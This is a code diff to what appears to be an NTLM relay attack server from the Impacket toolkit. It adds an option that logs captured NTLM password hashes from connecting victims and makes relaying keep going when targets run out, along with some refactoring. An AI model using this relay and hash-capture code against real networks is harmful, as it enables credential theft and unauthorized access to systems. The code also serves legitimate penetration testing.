@@ -43,7 +43,7 @@ from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToF
 from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from impacket.smbserver import getFileTime, decodeSMBString, encodeSMBString
+from impacket.smbserver import decodeSMBString, encodeSMBString
 from impacket.smb3structs import SMB2Error
 
 def auth_callback(smbServer, connData, domain_name, user_name, host_name):
@@ -91,6 +91,11 @@ class SMBRelayServer(Thread):
         if self.config.outputFile is not None:
             smbConfig.set('global','jtr_dump_path',self.config.outputFile)
 
+        if self.config.dumpHashes is True:
+            smbConfig.set("global", "dump_hashes", "True")
+        else:
+            smbConfig.set("global", "dump_hashes", "False")
+        
         if self.config.SMBServerChallenge is not None:
             smbConfig.set('global', 'challenge', self.config.SMBServerChallenge)
 
@@ -148,15 +153,15 @@ class SMBRelayServer(Thread):
 
             self.target = self.targetprocessor.getTarget(multiRelay=False)
             if self.target is None:
-                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
-                         (connId, connData['ClientIP']))
                 if self.config.keepRelaying:
                     self.config.target.reloadTargets(full_reload=True)
+                    self.target = self.targetprocessor.getTarget(multiRelay=False)
+                else:
+                    LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' % (connId, connData['ClientIP']))
+                    return [SMB2Error()], None, STATUS_BAD_NETWORK_NAME
 
-                return [SMB2Error()], None, STATUS_BAD_NETWORK_NAME
+            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme, self.target.netloc))
 
-            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme,
-                                                                                      self.target.netloc))
             try:
                 if self.config.mode.upper() == 'REFLECTION':
                     # Force standard security when doing reflection
@@ -207,8 +212,8 @@ class SMBRelayServer(Thread):
         respSMBCommand['MaxTransactSize'] = 65536
         respSMBCommand['MaxReadSize'] = 65536
         respSMBCommand['MaxWriteSize'] = 65536
-        respSMBCommand['SystemTime'] = getFileTime(calendar.timegm(time.gmtime()))
-        respSMBCommand['ServerStartTime'] = getFileTime(calendar.timegm(time.gmtime()))
+        respSMBCommand['SystemTime'] = smb.POSIXtoFT(calendar.timegm(time.gmtime()))
+        respSMBCommand['ServerStartTime'] = smb.POSIXtoFT(calendar.timegm(time.gmtime()))
         respSMBCommand['SecurityBufferOffset'] = 0x80
 
         blob = SPNEGO_NegTokenInit()
@@ -373,6 +378,9 @@ class SMBRelayServer(Thread):
                                                     authenticateMessage['ntlm'])
                 client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
+                if self.server.getDumpHashes():
+                    LOG.info(ntlm_hash_data['hash_string'])
+
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                           self.server.getJTRdumpPath())
@@ -425,16 +433,15 @@ class SMBRelayServer(Thread):
 
             self.target = self.targetprocessor.getTarget(identity = self.authUser)
             if self.target is None:
-                # No more targets to process, just let the victim to fail later
-                LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
-                         (connId, self.authUser, connData['ClientIP']))
                 if self.config.keepRelaying:
                     self.config.target.reloadTargets(full_reload=True)
+                    self.target = self.targetprocessor.getTarget(multiRelay=False)
+                else:
+                    # No more targets to process, just let the victim to fail later
+                    LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' % (connId, self.authUser, connData['ClientIP']))
+                    return self.origsmb2TreeConnect (connId, smbServer, recvPacket)
 
-                return self.origsmb2TreeConnect (connId, smbServer, recvPacket)
-
-            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % (connId, self.authUser,
-                                                        connData['ClientIP'], self.target.scheme, self.target.netloc))
+            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % (connId, self.authUser, connData['ClientIP'], self.target.scheme, self.target.netloc))
 
             if self.config.mode.upper() == 'REFLECTION':
                 # Force standard security when doing reflection
@@ -501,15 +508,14 @@ class SMBRelayServer(Thread):
 
             self.target = self.targetprocessor.getTarget(multiRelay=False)
             if self.target is None:
-                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
-                         (connId, connData['ClientIP']))
                 if self.config.keepRelaying:
                     self.config.target.reloadTargets(full_reload=True)
+                    self.target = self.targetprocessor.getTarget(multiRelay=False)
+                else:
+                    LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' % (connId, connData['ClientIP']))
+                    return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME
 
-                return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME
-
-            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'],
-                                                                                         self.target.scheme, self.target.netloc))
+            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme, self.target.netloc))
 
             try:
                 if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
@@ -667,6 +673,9 @@ class SMBRelayServer(Thread):
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
+                    if self.server.getDumpHashes():
+                        LOG.info(ntlm_hash_data['hash_string'])
+
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.getJTRdumpPath())
@@ -742,6 +751,9 @@ class SMBRelayServer(Thread):
                                                     sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                 client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
+                if self.server.getDumpHashes():
+                    LOG.info(ntlm_hash_data['hash_string'])
+
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                           self.server.getJTRdumpPath())
@@ -784,16 +796,15 @@ class SMBRelayServer(Thread):
 
             self.target = self.targetprocessor.getTarget(identity = self.authUser)
             if self.target is None:
-                # No more targets to process, just let the victim to fail later
-                LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
-                         (connId, self.authUser, connData['ClientIP']))
                 if self.config.keepRelaying:
                     self.config.target.reloadTargets(full_reload=True)
+                    self.target = self.targetprocessor.getTarget(multiRelay=False)
+                else:
+                    # No more targets to process, just let the victim to fail later
+                    LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' % (connId, self.authUser, connData['ClientIP']))
+                    return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)
 
-                return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)
-
-            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % ( connId, self.authUser,
-                                                        connData['ClientIP'], self.target.scheme, self.target.netloc))
+            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % ( connId, self.authUser, connData['ClientIP'], self.target.scheme, self.target.netloc))
 
             if self.config.mode.upper() == 'REFLECTION':
                 # Force standard security when doing reflection
